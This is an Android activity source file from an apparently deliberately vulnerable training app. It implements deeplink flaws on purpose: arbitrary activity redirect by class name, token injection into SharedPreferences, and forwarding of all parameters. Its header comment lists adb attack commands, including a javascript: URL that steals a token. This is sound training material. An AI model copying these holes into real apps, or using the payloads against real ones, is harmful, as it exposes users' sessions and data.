package com.vulndroid.app.activities;

import android.content.Intent;
import android.net.Uri;
import android.os.Bundle;
import android.widget.Toast;
import androidx.appcompat.app.AppCompatActivity;

/**
 * VULNERABILITY LAB — DeeplinkActivity
 *
 * Vulnerabilities present (intentional):
 *  [VULN-DL-01] Deeplink parameters passed directly to Intent without validation
 *  [VULN-DL-02] "redirect" param can launch arbitrary internal activities
 *  [VULN-DL-03] "token" param written to SharedPreferences from untrusted deeplink
 *  [VULN-DL-04] No origin / referrer check on incoming deeplink
 *
 * Attack vectors:
 *   # Open admin panel via deeplink redirect
 *   adb shell am start -a android.intent.action.VIEW \
 *       -d "vulndroid://settings?redirect=com.vulndroid.app.activities.AdminPanelActivity"
 *
 *   # Inject a fake token via deeplink
 *   adb shell am start -a android.intent.action.VIEW \
 *       -d "vulndroid://settings?token=ATTACKER_CONTROLLED_TOKEN"
 *
 *   # Redirect to external WebView with malicious URL
 *   adb shell am start -a android.intent.action.VIEW \
 *       -d "vulndroid://settings?redirect=WebViewActivity&url=javascript:VulnBridge.stealToken()"
 */
public class DeeplinkActivity extends AppCompatActivity {

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        Uri data = getIntent().getData();
        if (data == null) {
            finish();
            return;
        }

        // VULN-DL-03: Write token from deeplink directly into SharedPreferences
        String token = data.getQueryParameter("token");
        if (token != null) {
            getSharedPreferences("user_prefs", MODE_PRIVATE)
                .edit()
                .putString("auth_token", token)
                .apply();
            Toast.makeText(this, "Token updated", Toast.LENGTH_SHORT).show();
        }

        // VULN-DL-01 + DL-02: Redirect to any activity named in the URL
        String redirect = data.getQueryParameter("redirect");
        if (redirect != null) {
            try {
                Class<?> targetClass = Class.forName(redirect);
                Intent intent = new Intent(this, targetClass);

                // VULN-DL-01: All query params forwarded to the target activity
                for (String key : data.getQueryParameterNames()) {
                    intent.putExtra(key, data.getQueryParameter(key));
                }
                startActivity(intent);
            } catch (ClassNotFoundException e) {
                // Silently ignored — attacker gets error oracle
                Toast.makeText(this, "Activity not found: " + redirect, Toast.LENGTH_LONG).show();
            }
        }

        finish();
    }
}
